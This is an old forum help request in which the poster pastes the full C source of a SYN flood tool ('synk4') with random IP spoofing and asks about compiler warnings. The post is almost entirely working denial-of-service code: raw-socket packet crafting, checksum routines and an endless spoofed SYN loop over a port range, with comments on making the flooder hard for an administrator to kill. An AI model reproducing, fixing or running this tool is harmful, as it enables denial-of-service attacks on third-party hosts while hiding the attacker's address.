---
title: "Syn flood test-  big compiling problem"
date: 2008-08-04
forum: General Help
---

### Post by BEaSTFX on 2008-08-04
I want to test my system agains syn and syn and udp flood, but u have problem with compiling. Thats the error:


```
/* Syn Flooder by Zakath
 * TCP Functions by trurl_ (thanks man).
 * Some more code by Zakath.
 * Speed/Misc Tweaks/Enhancments -- ultima
 * Nice Interface -- ultima
 * Random IP Spoofing Mode -- ultima
 * How To Use:
 * Usage is simple. srcaddr is the IP the packets will be spoofed from.
 * dstaddr is the target machine you are sending the packets to.
 * low and high ports are the ports you want to send the packets to.
 * Random IP Spoofing Mode: Instead of typing in a source address, 
 * just use '0'. This will engage the Random IP Spoofing mode, and
 * the source address will be a random IP instead of a fixed ip.
 * Released: [4.29.97]
 ** To compile: cc -o synk4 synk4.c
 *
 * Addition and Change by Kenji Aiko
 * Released: [11.24.04]
 ** Vine Linux 2.4
 ** To compile: gcc -Wall synk4 synk4.c
 */
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netdb.h>

/* These can be handy if you want to run the flooder while the admin is on
 * this way, it makes it MUCH harder for him to kill your flooder */
/* Ignores all signals except Segfault */
// #define HEALTHY
/* Ignores Segfault */
// #define NOSEGV
/* ret random num function */
#define getrandom(min, max) ((rand() % (int)(((max) + 1) - (min))) + (min))

/* global: socket and send packet num */
int sock, packetcnt;


/* Check Sum */
unsigned short ip_sum(unsigned short *addr, int len)
{
* int sum = 0;
* unsigned short answer = 0;
* 
* while (len > 1){
* * sum += *addr++;
* * len -= 2;
* }
* if (len == 1){
* * *(unsigned char *)(&answer) = *(unsigned char *)addr;
* * sum += answer;
* }
* sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
* sum += (sum >> 16);* * * * * * * * */* add carry */
* answer = ~sum;* * * * * * * * * * * /* truncate to 16 bits */
* return(answer);
}


/* get address */
unsigned long getaddr(char *name)
{
* struct hostent *hep;
* hep = gethostbyname(name);
* if(!hep){
* * fprintf(stderr, "Unknown host %s\n", name);
* * exit(1);
* }
* return *(unsigned long *)hep->h_addr;
}



/* ------------------------------------------------------------------
 * make & send tcp packet
 * ------------------------------------------------------------------ */

void send_tcp_segment(struct iphdr *ih,
		* * * struct tcphdr *th,
		* * * char *data,
		* * * int dlen)
{
* char buf[4048];

* struct {* /* rfc 793 tcp pseudo-header */
* * unsigned long saddr, daddr;
* * char mbz;
* * char ptcl;
* * unsigned short tcpl;
* } ph;

* /* how necessary is this, given that 
* * *the destination address is already in the ip header? */* 
* struct sockaddr_in sin; 
* 
* ph.saddr = ih->saddr;
* ph.daddr = ih->daddr;
* ph.mbz* *= 0;
* ph.ptcl* = IPPROTO_TCP;
* ph.tcpl* = htons(sizeof(*th) + dlen);
* 
* memcpy(buf, &ph, sizeof(ph));
* memcpy(buf + sizeof(ph), th, sizeof(*th));
* memcpy(buf + sizeof(ph) + sizeof(*th), data, dlen);
* memset(buf + sizeof(ph) + sizeof(*th) + dlen, 0, 4);
* th->check = ip_sum((unsigned short *)buf,
		* * *(sizeof(ph) + sizeof(*th) + dlen + 1) & ~1);
* 
* memcpy(buf, ih, 4 * ih->ihl);
* memcpy(buf + 4 * ih->ihl, th, sizeof(*th));
* memcpy(buf + 4 * ih->ihl + sizeof(*th), data, dlen);
* memset(buf + 4 * ih->ihl + sizeof(*th) + dlen, 0, 4);
* ih->check = ip_sum((unsigned short *)buf, 
		* * *(4 * ih->ihl + sizeof(*th) + dlen + 1) & ~1);

* memcpy(buf, ih, 4 * ih->ihl);
* 
* sin.sin_family* * * = AF_INET;
* sin.sin_port* * * * = th->dest;
* sin.sin_addr.s_addr = ih->daddr;
* 
* if(sendto(sock, buf, 4 * ih->ihl + sizeof(*th) + dlen, 
	* * 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
* * fprintf(stderr, "Error sending syn packet.\n");
* * exit(1);
* }
}


void spoof_open(unsigned long my_ip,
* * * * * * * * unsigned long their_ip,
* * * * * * * * unsigned short srcport,
* * * * * * * * unsigned short desport)
{
* struct iphdr ih;
* struct tcphdr th;

* struct timeval tv;
* gettimeofday(&tv, 0);

* ih.version* = 4;
* ih.ihl* * * = 5;
* ih.tos* * * = 0; /* XXX is this normal? */
* ih.tot_len* = sizeof(ih) + sizeof(th);
* ih.id* * * *= htons(random());
* ih.frag_off = 0;
* ih.ttl* * * = 255;
* ih.protocol = IPPROTO_TCP;
* ih.check* * = 0;
* ih.saddr* * = my_ip;
* ih.daddr* * = their_ip;
* 
* th.source* *= htons(srcport);
* th.dest* * *= htons(desport);
* th.seq* * * = htonl(tv.tv_usec);
* th.doff* * *= sizeof(th) / 4;
* th.ack_seq* = 0;
* th.res1* * *= 0;
* th.fin* * * = 0;
* th.syn* * * = 1;
* th.rst* * * = 0;
* th.psh* * * = 0;
* th.ack* * * = 0;
* th.urg* * * = 0;
* th.res2* * *= 0;
* th.window* *= htons(65535);
* th.check* * = 0;
* th.urg_ptr* = 0;
* 
* send_tcp_segment(&ih, &th, "", 0);
}



/* ------------------------------------------------------------------
 * signal functions
 * ------------------------------------------------------------------ */

void sig_exit(int crap)
{
#ifndef HEALTHY
* fprintf(stderr, "Signal Caught. Exiting Cleanly.\n");
* exit(crap);
#endif
}


void sig_segv(int crap)
{
#ifndef NOSEGV
* fprintf(stderr, "Segmentation Violation Caught. Exiting Cleanly.\n");
* exit(crap);
#endif
}


void sig_alrm(int crap)
{
* static int timecnt = 0;
* printf("LapTime:%d000(ms), SendPacket:%d\n", timecnt++, packetcnt);
* alarm(1);
}


void init_signals(void)
{
* signal (SIGSEGV,* *sig_segv);* *signal (SIGALRM,* *sig_alrm);
* signal (SIGHUP,* * sig_exit);* *signal (SIGINT,* * sig_exit);
* signal (SIGQUIT,* *sig_exit);* *signal (SIGILL,* * sig_exit);
* signal (SIGTRAP,* *sig_exit);* *signal (SIGIOT,* * sig_exit);
* signal (SIGBUS,* * sig_exit);* *signal (SIGFPE,* * sig_exit);
* signal (SIGKILL,* *sig_exit);* *signal (SIGUSR1,* *sig_exit);
* signal (SIGUSR2,* *sig_exit);* *signal (SIGPIPE,* *sig_exit);
* signal (SIGTERM,* *sig_exit);* *signal (SIGPWR,* * sig_exit);
* signal (SIGCHLD,* *sig_exit);* *signal (SIGCONT,* *sig_exit);
* signal (SIGSTOP,* *sig_exit);* *signal (SIGTSTP,* *sig_exit);
* signal (SIGTTIN,* *sig_exit);* *signal (SIGTTOU,* *sig_exit);
* signal (SIGURG,* * sig_exit);* *signal (SIGXCPU,* *sig_exit);
* signal (SIGXFSZ,* *sig_exit);* *signal (SIGVTALRM, sig_exit);
* signal (SIGPROF,* *sig_exit);* *signal (SIGWINCH,* sig_exit);
* signal (SIGIO,* * *sig_exit);* *
}



/* ------------------------------------------------------------------
 * main function
 * ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
* int i, j, diff, urip, lowport, highport, srcport;
* unsigned long them, me_fake;
* char junk[1024];

* if(argc < 5){
* * fprintf(stderr, "Usage: %s <srcIP> <dstIP> <lowPort> <highPort>\n", argv[0]);
* * fprintf(stderr, " If srcIP is 0, random addresses will be used\n\n");
* * return 1;
* }

* urip = 0;
* if(atoi(argv[1]) == 0)
* * urip = 1;
* else
* * me_fake = getaddr(argv[1]);

* them = getaddr(argv[2]);
* lowport* = atoi(argv[3]);
* highport = atoi(argv[4]);

* if(lowport < 1 || 65535 < lowport || highport < 1 || 65535 < highport){
* * fprintf(stderr, "Port is 1 - 65535.\n");
* * return 1;
* }

* diff = (highport - lowport);
* if(diff < 1){
* * fprintf(stderr, "High port must be greater than Low port.\n");
* * return 1;
* }

* init_signals();

* /* "sock" is global var */
* sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
* if(sock < 0){
* * fprintf(stderr, "socket (raw)\n");
* * return 1;
* }

* printf("\nCopyright (c) 1980, 1983, 1986, 1988, 1990, 1991, 2004\n"
	 "The Regents of the University of California. All Rights Reserved.\n");

* alarm(1);
* packetcnt = 0; /* "packetcnt" is global var */
* for(i=1; i < 0x7FFFFFFF; i++){
* * srandom(time(0) + i);
* * srcport = getrandom(1024, 65535);
* * for(j=lowport; j <= highport; j++){
* * * if(urip == 1){
	sprintf(junk, "%i.%i.%i.%i",
		getrandom(0, 255),
		getrandom(0, 255),
		getrandom(0, 255),
		getrandom(0, 255));
	me_fake = getaddr(junk);
* * * }
* * * spoof_open(me_fake, them, srcport, j);
* * * packetcnt++;
* * }
* }
* printf("0x7FFFFFFF or more packets were sended.\n");
* return 0;
}
```

Thats the error :) 

```
beastfx@Deyanov:~$ sudo cc -o synk4 flooder.c
flooder.c: In function &#8216;send_tcp_segment&#8217;:
flooder.c:113: warning: incompatible implicit declaration of built-in function &#8216;memcpy&#8217;
flooder.c:116: warning: incompatible implicit declaration of built-in function &#8216;memset&#8217;

```

---

